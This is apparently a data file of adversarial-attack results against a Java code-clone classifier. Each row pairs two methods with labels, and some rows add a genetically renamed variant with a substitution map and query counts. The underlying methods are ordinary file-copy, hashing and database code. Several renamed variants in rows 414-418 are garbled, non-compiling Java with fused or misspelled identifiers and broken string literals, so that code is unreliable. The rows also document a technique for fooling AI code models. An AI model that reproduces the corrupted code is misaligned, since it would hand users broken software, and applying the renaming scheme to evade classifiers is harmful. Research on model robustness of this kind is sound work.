            md.update((byte) 0);
            md.update(attribute.getAttributeValue().getBytes(""UnicodeBigUnmarked""));
            digest = md.digest();
        } catch (NoSuchAlgorithmException e) {
            throw new OMException(e);
        } catch (UnsupportedEncodingException e) {
            throw new OMException(e);
        }
        return digest;
    }
",275,,LABEL_0,LABEL_0,LABEL_0,-1,"connect,status,reply,isConnected",,,,0,,0,GA,1597,0.5830945332845052,failed,[]
412,"    public static void fileCopy(String from_name, String to_name) throws IOException {
        File fromFile = new File(from_name);
        File toFile = new File(to_name);
        if (fromFile.equals(toFile)) abort(""cannot copy on itself: "" + from_name);
        if (!fromFile.exists()) abort(""no such currentSourcepartName file: "" + from_name);
        if (!fromFile.isFile()) abort(""can't copy directory: "" + from_name);
        if (!fromFile.canRead()) abort(""currentSourcepartName file is unreadable: "" + from_name);
        if (toFile.isDirectory()) toFile = new File(toFile, fromFile.getName());
        if (toFile.exists()) {
            if (!toFile.canWrite()) abort(""destination file is unwriteable: "" + to_name);
        } else {
            String parent = toFile.getParent();
            if (parent == null) abort(""destination directory doesn't exist: "" + parent);
            File dir = new File(parent);
            if (!dir.exists()) abort(""destination directory doesn't exist: "" + parent);
            if (dir.isFile()) abort(""destination is not a directory: "" + parent);
            if (!dir.canWrite()) abort(""destination directory is unwriteable: "" + parent);
        }
        FileInputStream from = null;
        FileOutputStream to = null;
        try {
            from = new FileInputStream(fromFile);
            to = new FileOutputStream(toFile);
            byte[] buffer = new byte[4096];
            int bytes_read;
            while ((bytes_read = from.read(buffer)) != -1) to.write(buffer, 0, bytes_read);
        } finally {
            if (from != null) try {
                from.close();
            } catch (IOException e) {
                ;
            }
            if (to != null) try {
                to.close();
            } catch (IOException e) {
                ;
            }
        }
    }
 <SPLIT>     private void forBundle(BundleManipulator manip) {
        ByteArrayOutputStream bout = null;
        try {
            bout = new ByteArrayOutputStream();
            ZipOutputStream zout = new ZipOutputStream(bout);
            Bundle bundle = getBundle();
            Enumeration<URL> files = bundle.findEntries(""/"", ""*.vm"", false);
            if (files != null) {
                while (files.hasMoreElements()) {
                    URL url = files.nextElement();
                    String name = url.getFile();
                    if (name.startsWith(""/"")) {
                        name = name.substring(1);
                    }
                    if (manip.includeEntry(name)) {
                        zout.putNextEntry(new ZipEntry(name));
                        IOUtils.copy(url.openStream(), zout);
                    }
                }
            }
            manip.finish(bundle, zout);
            Manifest mf = new Manifest(bundle.getEntry(""META-INF/MANIFEST.MF"").openStream());
            zout.putNextEntry(new ZipEntry(""META-INF/MANIFEST.MF""));
            mf.write(zout);
            zout.close();
            File tmpFile = File.createTempFile(TEMPLATES_SYMBOLIC_NAME, "".jar"");
            FileUtils.writeByteArrayToFile(tmpFile, bout.toByteArray());
            if (pluginAccessor.getPlugin(TEMPLATES_SYMBOLIC_NAME) != null) {
                pluginController.uninstall(pluginAccessor.getPlugin(TEMPLATES_SYMBOLIC_NAME));
            } else if (pluginAccessor.getPlugin(TEMPLATES_PLUGIN_KEY) != null) {
                pluginController.uninstall(pluginAccessor.getPlugin(TEMPLATES_PLUGIN_KEY));
            }
            pluginController.installPlugin(new JarPluginArtifact(tmpFile));
            ServiceReference ref = bundleContext.getServiceReference(PackageAdmin.class.getName());
            ((PackageAdmin) bundleContext.getService(ref)).refreshPackages(null);
            tmpFile.delete();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            IOUtils.closeQuietly(bout);
        }
    }
",364,,LABEL_1,LABEL_1,LABEL_1,-1,"fileCopy,from_name,to_name,fromFile,toFile,parent,dir,from,to,buffer,bytes_read",,,,0,,0,GA,3843,1.4620101809501649,failed,[]
413,"    public void doBody(JWebLiteRequestWrapper req, JWebLiteResponseWrapper resp) throws SkipException {
        BufferedInputStream bis = null;
        BufferedOutputStream bos = null;
        try {
            bis = new BufferedInputStream(new FileInputStream(this.loadData(req)));
            bos = new BufferedOutputStream(resp.getOutputStream());
            IOUtils.copy(bis, bos);
            bos.flush();
        } catch (Exception e) {
            _cat.warn(""Write data failed!"", e);
        } finally {
            IOUtils.closeQuietly(bis);
            IOUtils.closeQuietly(bos);
        }
    }
 <SPLIT>     @Test
    public void test01_ok_failed_500_no_logo() throws Exception {
        DefaultHttpClient client = new DefaultHttpClient();
        try {
            HttpPost post = new HttpPost(xlsURL);
            HttpResponse response = client.execute(post);
            assertEquals(""failed code for "", 500, response.getStatusLine().getStatusCode());
        } finally {
            client.getConnectionManager().shutdown();
        }
    }
",107,,LABEL_0,LABEL_0,LABEL_0,-1,"doBody,req,resp,bis,bos",,,,0,,0,GA,1889,0.6662533521652222,failed,[]
414,"    protected Control createDialogArea(Composite parent) {
        Composite composite = (Composite) super.createDialogArea(parent);
        setTitle(DialogsMessages.getString(""LicenseDialog.Caption""));
        setMessage(DialogsMessages.getString(""LicenseDialog.Explanation""));
        Composite content = new Composite(composite, SWT.NONE);
        content.setLayoutData(new GridData(GridData.FILL_BOTH));
        final int ncol = 1;
        GridLayout layout = new GridLayout(1, false);
        layout.numColumns = ncol;
        content.setLayout(layout);
        Browser browser = null;
        Text text = null;
        try {
            browser = new Browser(content, SWT.NONE);
            browser.setLayoutData(new GridData(GridData.FILL_BOTH));
        } catch (Throwable t) {
            text = new Text(content, SWT.MULTI | SWT.WRAP | SWT.VERTICAL);
            text.setLayoutData(new GridData(GridData.FILL_BOTH));
        }
        URL url = PalobrowserPlugin.getDefault().getBundle().getResource(browser != null ? ""license.html"" : ""license.txt"");
        InputStream in = null;
        BufferedReader r = null;
        StringBuffer sb = new StringBuffer();
        try {
            in = url.openStream();
            r = new BufferedReader(new InputStreamReader(in, ""ISO-8859-1""));
            String line;
            while ((line = r.readLine()) != null) sb.append(line).append(""\r\n"");
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (r != null) {
                try {
                    r.close();
                } catch (IOException e) {
                }
            }
            if (in != null) {
                try {
                    in.close();
                } catch (IOException e) {
                }
            }
        }
        if (browser != null) browser.setText(sb.toString()); else text.setText(sb.toString());
        return composite;
    }
 <SPLIT>     public static InputStream getFileInputStream(String path) throws IOException {
        InputStream is = null;
        File file = new File(path);
        if (file.exists()) is = new BufferedInputStream(new FileInputStream(file));
        if (is == null) {
            URL url = FileUtils.class.getClassLoader().getResource(path);
            is = (url == null) ? null : url.openStream();
        }
        return is;
    }
",382,"    protected Control createDialogArea(Composite c) {
        Compocomositeosite = (Composite) super.createDialogArea(c);
        setTitle(DialogsMessages.getString(""LicenseDialog.Caption""));
        setMessage(DialogsMessages.getString(""LicenseDialog.Explanation""));
        Compositefilet = new Composite(comosite, SWT.NONE);
        file.setLayoutData(new GridData(GridData.FILL_BOTH));
        final int ncol = 1;
        GridLayout widget = new GridLayout(1, false);
        widget.numcolumnn = ncol;
        file.setLayout(widget);
        Browser browser = null;
        Text path = null;
        try {
         browserser = new Browser(file, SWT.NONE);
            browser.setLayoutData(new GridData(GridData.FILL_BOTH));
        } catch (Throwable t) {
         pathext = new Text(file, SWT.MULTI | SWT.WRAP | SWT.VERTICAL);
            path.setLayoutData(new GridData(GridData.FILL_BOTH));
        }
        URL file = PalobrowserPlugin.getDefault().getBundle().getResource(browser != null ? ""license.html"" : ""license.txt"");
        InputStream on = null;
        BufferedReader ar = null;
        StringBuffer lab = new StringBuffer();
        try {
            ion= file.openStream();
            ar = new BufferedReader(new InputStreamReader(on, ""ISO-8859-1""));
            String line;
            while ((liline ar.readLine()) != null) lab.append(line).append(""\r
"");
        } catch (IOException se) {
            se.printStackTrace();
        } finally {
            if (ar != null) {
                try {
                    ar.close();
                } catch (IOException se) {
                }
            }
            if (on != null) {
                try {
                    on.close();
                } catch (IOException se) {
                }
            }
        }
        if (browser != null) browser.setText(lab.toString()); else path.setText(lab.toString());
        return comosite;
    }
",LABEL_0,LABEL_0,0.5288058519363403,1,"createDialogArea,parent,composite,content,ncol,layout,numColumns,browser,text,url,in,r,sb,line,e",,,,13,"createDialogArea:createDialogArea,parent:c,composite:comosite,content:file,ncol:ncol,layout:widget,numColumns:numcolumnn,browser:browser,text:path,url:file,in:on,r:ar,sb:lab,line:line,e:se,",4,GA,1373,0.5093425472577413,ga,[]
415,"    public static void main(String[] argv) {
        if (1 < argv.length) {
            File[] sources = Source(argv[0]);
            if (null != sources) {
                for (File src : sources) {
                    File[] targets = Target(src, argv);
                    if (null != targets) {
                        final long srclen = src.length();
                        try {
                            FileChannel source = new FileInputStream(src).getChannel();
                            try {
                                for (File tgt : targets) {
                                    FileChannel target = new FileOutputStream(tgt).getChannel();
                                    try {
                                        source.transferTo(0L, srclen, target);
                                    } finally {
                                        target.close();
                                    }
                                    System.out.printf(""Updated %s\n"", tgt.getPath());
                                    File[] deletes = Delete(src, tgt);
                                    if (null != deletes) {
                                        for (File del : deletes) {
                                            if (SVN) {
                                                if (SvnDelete(del)) System.out.printf(""Deleted %s\n"", del.getPath()); else System.out.printf(""Failed to delete %s\n"", del.getPath());
                                            } else if (del.delete()) System.out.printf(""Deleted %s\n"", del.getPath()); else System.out.printf(""Failed to delete %s\n"", del.getPath());
                                        }
                                    }
                                    if (SVN) SvnAdd(tgt);
                                }
                            } finally {
                                source.close();
                            }
                        } catch (Exception exc) {
                            exc.printStackTrace();
                            System.exit(1);
                        }
                    }
                }
                System.exit(0);
            } else {
                System.err.printf(""Source file(s) not found in '%s'\n"", argv[0]);
                System.exit(1);
            }
        } else {
            usage();
            System.exit(1);
        }
    }
 <SPLIT>     private static void copyFiles(String strPath, String dstPath) throws Exception {
        File src = new File(strPath);
        File dest = new File(dstPath);
        if (src.isDirectory()) {
            dest.mkdirs();
            String list[] = src.list();
            for (int i = 0; i < list.length; i++) {
                String dest1 = dest.getAbsolutePath() + ""\\"" + list[i];
                String src1 = src.getAbsolutePath() + ""\\"" + list[i];
                copyFiles(src1, dest1);
            }
        } else {
            FileChannel sourceChannel = new FileInputStream(src).getChannel();
            FileChannel targetChannel = new FileOutputStream(dest).getChannel();
            sourceChannel.transferTo(0, sourceChannel.size(), targetChannel);
            sourceChannel.close();
            targetChannel.close();
        }
    }
",370,"    public static void main(String[] interc) {
        if (1 < interc.length) {
            File[] sosources Source(interc[0]);
            if (null != sources) {
                for (File src : sources) {
                    File[] tatargets Target(src, interc);
                    if (null != targets) {
                        final long srclen = src.length();
                        try {
                            FileChannel url = new FileInputStream(src).getChannel();
                            try {
                                for (File  tch : targets) {
                                    FileChannel ttarget= new FileOutputStream( tch).getChannel();
                                    try {
                                        url.transferTo(0L, srclen, target);
                                    } finally {
                                        target.close();
                                    }
                                    System.out.printf(""Updated %s
"",  tch.getPath());
                                    File[] ddeletes= Delete(src,  tch);
                                    if (null != deletes) {
                                        for (File ul : deletes) {
                                            if (SVN) {
                                                if (SvnDelete(ul)) System.out.printf(""Deleted %s
"", ul.getPath()); else System.out.printf(""Failed to delete %s
"", ul.getPath());
                                            } else if (ul.delete()) System.out.printf(""Deleted %s
"", ul.getPath()); else System.out.printf(""Failed to delete %s
"", ul.getPath());
                                        }
                                    }
                                    if (SVN) SvnAdd( tch);
                                }
                            } finally {
                                url.close();
                            }
                        } catch (Exception exc) {
                            exc.printStackTrace();
                            System.exit(1);
                        }
                    }
                }
                System.exit(0);
            } else {
                System.err.printf(""Source file(s) not found in '%s'
"", interc[0]);
                System.exit(1);
            }
        } else {
            usage();
            System.exit(1);
        }
    }
",LABEL_1,LABEL_1,0.6565561294555664,1,"argv,sources,targets,srclen,source,tgt,target,deletes,del",,,,14,"argv:interc,sources:sources,targets:targets,srclen:srclen,source:url,tgt: tch,target:target,deletes:deletes,del:ul,",5,GA,552,0.20619404315948486,ga,[]
416,"    public void createJAR(String fileString, String ext) {
        try {
            File file = new File(fileString);
            int i = fileString.lastIndexOf(java.io.File.separator);
            String dir = fileString.substring(0, i + 1);
            if (ext.matches(""jar"")) {
                jarFile = new File(getClass().getClassLoader().getResource(""jsdviewer.jar"").toURI());
                java.io.FileOutputStream fstrm = new java.io.FileOutputStream(file);
                FileChannel in = (new java.io.FileInputStream(jarFile)).getChannel();
                FileChannel out = fstrm.getChannel();
                in.transferTo(0, jarFile.length(), out);
                in.close();
                out.close();
            } else {
                file.mkdir();
            }
            File.umount(file);
            File temp = new File(dir + ""document.jsd"");
            FileOutputStream fstrm2 = new FileOutputStream(temp.getCanonicalPath());
            ostrm = new ObjectOutputStream(fstrm2);
            ostrm.writeObject(doc);
            ostrm.flush();
            ostrm.close();
            File.umount();
            File docFile = new File(file.getCanonicalPath() + java.io.File.separator + ""document.jsd"");
            File.cp_p(temp, docFile);
            File.umount();
            temp.delete();
            File.umount(file);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 <SPLIT>     private void copyParseFileToCodeFile() throws IOException {
        InputStream in = new FileInputStream(new File(filenameParse));
        OutputStream out = new FileOutputStream(new File(filenameMisc));
        byte[] buffer = new byte[1024];
        int length;
        while ((length = in.read(buffer)) > 0) out.write(buffer, 0, length);
        in.close();
        out.close();
    }
",306,"    public void createJAR(String linestring, String txt) {
        try {
            File url = new File(linestring);
            int abi = linestring.lastIndexOf(java.io.File.separator);
            String didir linestring.substring(0, abi + 1);
            if (txt.matches(""jar"")) {
                 jarfile = new File(getClass().getClassLoader().getResource(""jsdviewer.jar"").toURI());
                java.io.FileOutputStreamfstrmm = new java.io.FileOutputStream(url);
                FileChannel iis= (new java.io.FileInputStream( jarfile)).getChannel();
                FileChannel sync = fstrm.getChannel();
                iistransferTo(0,  jarfile.length(), sync);
                is.close();
                sync.close();
            } else {
                url.mkdir();
            }
            File.umount(url);
            File  Temp = new File(dir + ""document.jsd"");
            FileOutputStream ffstM0= new FileOutputStream( Temp.getCanonicalPath());
           ooprmm = new ObjectOutputStream(fstM0);
            ooprm.writeObject(doc);
            ooprm.flush();
            ooprm.close();
            File.umount();
            FiledocumentFilee = new File(url.getCanonicalPath() + java.io.File.separator + ""document.jsd"");
            File.cp_p( Temp, documentFile);
            File.umount();
             Temp.delete();
            File.umount(url);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
",LABEL_1,LABEL_1,0.5381300449371338,1,"createJAR,fileString,ext,file,i,dir,jarFile,fstrm,in,out,temp,fstrm2,ostrm,docFile",,,,5,"createJAR:createJAR,fileString:linestring,ext:txt,file:url,i:abi,dir:dir,jarFile: jarfile,fstrm:fstrm,in:is,out:sync,temp: Temp,fstrm2:fstM0,ostrm:ooprm,docFile:documentFile,",3,GA,1090,0.3995577176411947,ga,[]
417,"    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        String path = request.getPathTranslated().substring(0, request.getPathTranslated().length() - request.getPathInfo().length()) + request.getServletPath() + request.getPathInfo();
        File file = new File(path);
        if (file.exists()) {
            FileInputStream in = new FileInputStream(file);
            IOUtils.copyLarge(in, response.getOutputStream());
            in.close();
        }
    }
 <SPLIT>     public static String md5(String text) {
        String encrypted = """";
        try {
            MessageDigest md = MessageDigest.getInstance(""MD5"");
            md.update(text.getBytes());
            encrypted = hex(md.digest());
        } catch (NoSuchAlgorithmException nsaEx) {
        }
        return encrypted;
    }
",110,,LABEL_0,LABEL_0,LABEL_0,-1,"doGet,request,response,path,file,in",,,,0,,0,GA,2249,0.7903517603874206,failed,[]
418,"    private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
 <SPLIT>     public void copyToDir(File dir) {
        if (!dir.exists()) {
            dir.mkdirs();
        } else if (this.file.getParentFile() != null && this.file.getParentFile().equals(dir)) {
            return;
        }
        File file = getEstimatedFileName(dir);
        try {
            file.createNewFile();
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            FileInputStream fileInputStream = new FileInputStream(this.file);
            int read = 0;
            byte[] buffer = new byte[1024];
            while (read != -1) {
                fileOutputStream.write(buffer, 0, read);
                read = fileInputStream.read(buffer);
            }
            fileInputStream.close();
            fileOutputStream.close();
            this.file = file;
        } catch (IOException e) {
            Logger.log(e);
        }
    }
",272,"    private static void readAndRewrite(File inFile, File outFilename) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dmissionPlugin = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dmissionPlugin.setDcmHandler(ds.getDcmHandler());
        dmissionPlugin.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader =pdReadernewReader(ds, iis, ddsssionPlugin.getDcmDecodeParam().byteOrder, dmissionPlugin.getReadVR());
        System.url.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out urlmageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFilename)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(url, dcmEncParam);
        ds.writeHedser(out, dcmEnurlradcmEncParamelData, dmissionPlugin.getReadVR(), dmissionPlugin.getReadLength());
        System.out.urlntln(""writing "" + outFilename + ""..."");
        PixelDataWriter pdWriter =pdWriternewWriter(pdReader.gpdReaderataArray(), false, ds, out, ddsssurlPlugin.getDcmDecodeParam().byteOrder, dmissionPlugin.getReadVR());
        pdWriter.writePixelData();
        url.flush();
        url.close();
        System.url.println(""done!"");
    }
",LABEL_1,LABEL_1,0.674767017364502,1,"readAndRewrite,inFile,outFile,iis,dcmParser,ds,pdReader,out,dcmEncParam,pdWriter",,,,21,"readAndRewrite:readAndRewrite,inFile:inFile,outFile:outFilename,iis:iis,dcmParser:dmissionPlugin,ds:ds,pdReader:pdReader,out:url,dcmEncParam:dcmEncParam,pdWriter:pdWriter,",7,GA,610,0.22430755297342936,ga,[]
419,"    public static boolean dump(File source, File target) {
        boolean done = false;
        try {
            InputStream is = new BufferedInputStream(new FileInputStream(source));
            OutputStream os = new BufferedOutputStream(new FileOutputStream(target));
            while (is.available() > 0) {
                os.write(is.read());
            }
            os.flush();
            os.close();
            is.close();
            return true;
        } catch (IOException e) {
        }
        return done;
    }
 <SPLIT>     @Override
    public void incluir(Igreja igreja) throws Exception {
        Connection connection = criaConexao(false);
        String sql = ""insert into igreja ? as idlocal, ? as possui_salao;"";
        String sql2 = ""SELECT MAX(idlocal) FROM Local"";
        PreparedStatement stmt = null;
        PreparedStatement stmt2 = null;
        ResultSet rs = null;
        try {
            stmt = connection.prepareStatement(sql);
            stmt2 = connection.prepareStatement(sql2);
            rs = stmt2.executeQuery();
            stmt.setInt(1, rs.getInt(""max""));
            stmt.setBoolean(2, igreja.getPossuiSalao());
            int retorno = stmt.executeUpdate();
            if (retorno == 0) {
                connection.rollback();
                throw new SQLException(""Ocorreu um erro inesperado no momento de inserir dados de cliente no banco!"");
            }
            connection.commit();
        } catch (SQLException e) {
            connection.rollback();
            throw e;
        } finally {
            try {
                stmt.close();
                stmt2.close();
                rs.close();
                this.fechaConexao();
            } catch (SQLException e) {
                throw e;
            }
        }
    }
",102,,LABEL_0,LABEL_0,LABEL_0,-1,"dump,source,target,is,os,done",,,,0,,0,GA,2257,0.8047008911768595,failed,[]
420,"    private void modifyProperty(String valueID, String value, Long userID) throws JspTagException {
        Property property = new Property(new Long(valueID), userID);
        String newValue = value;
        System.out.println(property.getName());
        if (property.getName().equals(""Password"")) {
            try {
                MessageDigest crypt = MessageDigest.getInstance(""MD5"");
                crypt.update(value.getBytes());
                byte digest[] = crypt.digest();
                StringBuffer hexString = new StringBuffer();
                for (int i = 0; i < digest.length; i++) {
                    hexString.append(hexDigit(digest[i]));
                }
                newValue = hexString.toString();
                crypt.reset();
            } catch (NoSuchAlgorithmException e) {
                System.err.println(""jspShop: Could not get instance of MD5 algorithm. Please fix this!"" + e.getMessage());
                e.printStackTrace();
                throw new JspTagException(""Error crypting password!: "" + e.getMessage());
            }
        }
        property.setValue(newValue);
    }
 <SPLIT>     public static byte[] hash(final byte[] saltBefore, final String content, final byte[] saltAfter, final int repeatedHashingCount) throws NoSuchAlgorithmException, UnsupportedEncodingException {
        if (content == null) return null;
        final MessageDigest digest = MessageDigest.getInstance(DIGEST);
        if (digestLength == -1) digestLength = digest.getDigestLength();
        for (int i = 0; i < repeatedHashingCount; i++) {
            if (i > 0) digest.update(digest.digest());
            digest.update(saltBefore);
            digest.update(content.getBytes(WebCastellumFilter.DEFAULT_CHARACTER_ENCODING));
            digest.update(saltAfter);
        }
        return digest.digest();
    }
",210,,LABEL_1,LABEL_1,LABEL_1,-1,"modifyProperty,valueID,value,userID,property,newValue,crypt,digest,hexString,i",,,,0,,0,GA,3647,1.314650253454844,failed,[]
421,"    public static boolean check(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setConnectTimeout(2000);
            urlConnection.getContent();
        } catch (Exception e) {
            logger.error(""There is no internet connection"", e);
            return false;
        }
        return true;
    }
 <SPLIT>     private static void readAndRewrite(File inFile, File outFile) throws IOException {
        ImageInputStream iis = ImageIO.createImageInputStream(new BufferedInputStream(new FileInputStream(inFile)));
        DcmParser dcmParser = DcmParserFactory.getInstance().newDcmParser(iis);
        Dataset ds = DcmObjectFactory.getInstance().newDataset();
        dcmParser.setDcmHandler(ds.getDcmHandler());
        dcmParser.parseDcmFile(null, Tags.PixelData);
        PixelDataReader pdReader = pdFact.newReader(ds, iis, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        System.out.println(""reading "" + inFile + ""..."");
        pdReader.readPixelData(false);
        ImageOutputStream out = ImageIO.createImageOutputStream(new BufferedOutputStream(new FileOutputStream(outFile)));
        DcmEncodeParam dcmEncParam = DcmEncodeParam.IVR_LE;
        ds.writeDataset(out, dcmEncParam);
        ds.writeHeader(out, dcmEncParam, Tags.PixelData, dcmParser.getReadVR(), dcmParser.getReadLength());
        System.out.println(""writing "" + outFile + ""..."");
        PixelDataWriter pdWriter = pdFact.newWriter(pdReader.getPixelDataArray(), false, ds, out, dcmParser.getDcmDecodeParam().byteOrder, dcmParser.getReadVR());
        pdWriter.writePixelData();
        out.flush();
        out.close();
        System.out.println(""done!"");
    }
",72,,LABEL_0,LABEL_0,LABEL_0,-1,"check,urlStr,url,urlConnection",,,,0,,0,GA,1009,0.36687246561050413,failed,[]
422,"    protected static void clearTables() throws SQLException {
        Connection conn = null;
        Statement stmt = null;
        try {
            conn = FidoDataSource.getConnection();
            conn.setAutoCommit(false);
            stmt = conn.createStatement();
            ClearData.clearTables(stmt);
            stmt.executeUpdate(""delete from Objects"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (1, 'Money value')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (2, 'Date')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (3, 'Unix path')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (4, 'Dos path')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (5, 'Time')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (6, 'IP address')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (7, 'Internet hostname')"");
            stmt.executeUpdate(""insert into Objects (ObjectId, Description) values (8, 'Number')"");
            conn.commit();
        } catch (SQLException e) {
            if (conn != null) conn.rollback();
            throw e;
        } finally {
            if (stmt != null) stmt.close();
            if (conn != null) conn.close();
        }
    }
 <SPLIT>     public int update(BusinessObject o) throws DAOException {
        int update = 0;
        Contact contact = (Contact) o;
        try {
            PreparedStatement pst = connection.prepareStatement(XMLGetQuery.getQuery(""UPDATE_CONTACT""));
            pst.setString(1, contact.getName());
            pst.setString(2, contact.getFirstname());
            pst.setString(3, contact.getPhone());
            pst.setString(4, contact.getEmail());
            if (contact.getAccount() == 0) {
                pst.setNull(5, java.sql.Types.INTEGER);
            } else {
                pst.setInt(5, contact.getAccount());
            }
            pst.setBoolean(6, contact.isArchived());
            pst.setInt(7, contact.getId());
            update = pst.executeUpdate();
            if (update <= 0) {
                connection.rollback();
                throw new DAOException(""Number of rows <= 0"");
            } else if (update > 1) {
                connection.rollback();
                throw new DAOException(""Number of rows > 1"");
            }
            connection.commit();
        } catch (SQLException e) {
            Log.write(e.getMessage());
            throw new DAOException(""A SQLException has occured"");
        } catch (NullPointerException npe) {
            Log.write(npe.getMessage());
            throw new DAOException(""Connection null"");
        }
        return update;
    }
",191,,LABEL_1,LABEL_1,LABEL_1,-1,"clearTables,conn,stmt",,,,0,,0,GA,1326,0.48603907028834026,failed,[]
423,"    protected byte[] getHashedID(String ID) {
        try {
            MessageDigest md5 = MessageDigest.getInstance(""MD5"");
            md5.reset();
            md5.update(ID.getBytes());
            byte[] digest = md5.digest();
            byte[] bytes = new byte[WLDB_ID_SIZE];
            for (int i = 0; i < bytes.length; i++) {
                bytes[i] = digest[i];
            }
            return bytes;
        } catch (NoSuchAlgorithmException exception) {
            System.err.println(""Java VM is not compatible"");
            exit();
            return null;
        }
    }
 <SPLIT>     public static boolean decodeFileToFile(String infile, String outfile) {
        boolean success = false;
        java.io.InputStream in = null;
        java.io.OutputStream out = null;
        try {
            in = new Base64.InputStream(new java.io.BufferedInputStream(new java.io.FileInputStream(infile)), Base64.DECODE);
            out = new java.io.BufferedOutputStream(new java.io.FileOutputStream(outfile));
            byte[] buffer = new byte[65536];
            int read = -1;
            while ((read = in.read(buffer)) >= 0) {
                out.write(buffer, 0, read);
            }
            success = true;
        } catch (java.io.IOException exc) {
            exc.printStackTrace();
        } finally {
            try {
                in.close();
            } catch (Exception exc) {
            }
            try {
                out.close();
            } catch (Exception exc) {
            }
        }
        return success;
    }
",122,,LABEL_0,LABEL_0,LABEL_0,-1,"getHashedID,ID,md5,digest,bytes,i",,,,0,,0,GA,2211,0.7875247399012247,failed,[]
424,"    public Converter(String input, String output) {
        try {
            FileInputStream fis = new FileInputStream(new File(input));
            BufferedReader in = new BufferedReader(new InputStreamReader(fis, ""SJIS""));
            FileOutputStream fos = new FileOutputStream(new File(output));
            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(fos, ""UTF8""));
            int len = 80;
            char buf[] = new char[len];
            int numRead;
            while ((numRead = in.read(buf, 0, len)) != -1) out.write(buf, 0, numRead);
            out.close();
            in.close();
        } catch (IOException e) {
            System.out.println(""An I/O Exception Occurred: "" + e);
        }
    }
 <SPLIT>     private static String encrypt(String algorithm, String password, Long digestSeed) {
        try {
            MessageDigest digest = MessageDigest.getInstance(algorithm);
            digest.reset();
            digest.update(password.getBytes(""UTF-8""));
            digest.update(digestSeed.toString().getBytes(""UTF-8""));
            byte[] messageDigest = digest.digest();
            StringBuffer hexString = new StringBuffer();
            for (int i = 0; i < messageDigest.length; i++) {
                hexString.append(Integer.toHexString((0xf0 & messageDigest[i]) >> 4));
                hexString.append(Integer.toHexString(0x0f & messageDigest[i]));
            }
            return hexString.toString();
        } catch (NoSuchAlgorithmException e) {
            throw new RuntimeException(e);
        } catch (UnsupportedEncodingException e) {
            throw new RuntimeException(e);
        } catch (NullPointerException e) {
            return new StringBuffer().toString();
        }
    }
",156,,LABEL_0,LABEL_0,LABEL_0,-1,"input,output,fis,in,fos,out,len,buf,numRead",,,,0,,0,GA,3321,1.1904353578885396,failed,[]
425,"    public static void save(String packageName, ArrayList<byte[]> fileContents, ArrayList<String> fileNames) throws Exception {
        String dirBase = Util.JAVA_DIR + File.separator + packageName;
        File packageDir = new File(dirBase);
        if (!packageDir.exists()) {
            boolean created = packageDir.mkdir();
            if (!created) {
                File currentPath = new File(""."");
                throw new Exception(""Directory "" + packageName + "" could not be created. Current directory: "" + currentPath.getAbsolutePath());
            }
        }
        for (int i = 0; i < fileContents.size(); i++) {
            File file = new File(Util.JAVA_DIR + File.separator + fileNames.get(i));
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(fileContents.get(i));
            fos.flush();
            fos.close();
        }
        for (int i = 0; i < fileNames.size(); i++) {
            File fileSrc = new File(Util.JAVA_DIR + File.separator + fileNames.get(i));
            File fileDst = new File(dirBase + File.separator + fileNames.get(i));
            BufferedReader reader = new BufferedReader(new FileReader(fileSrc));
            BufferedWriter writer = new BufferedWriter(new FileWriter(fileDst));
            writer.append(""package "" + packageName + "";\n"");
            String line = """";
            while ((line = reader.readLine()) != null) writer.append(line + ""\n"");
            writer.flush();
            writer.close();
            reader.close();
        }
    }
 <SPLIT>     private void unzip(File filename) throws ZipException, IOException {
        ZipInputStream in = new ZipInputStream(new BufferedInputStream(new FileInputStream(filename)));
        ZipEntry entry = null;
        boolean first_entry = true;
        while ((entry = in.getNextEntry()) != null) {
            if (first_entry) {
                if (!entry.isDirectory()) {
                    File subdir = new File(dir + File.separator + filename.getName().substring(0, filename.getName().length() - SUFFIX_ZIP.length()));
                    if (!subdir.exists()) {
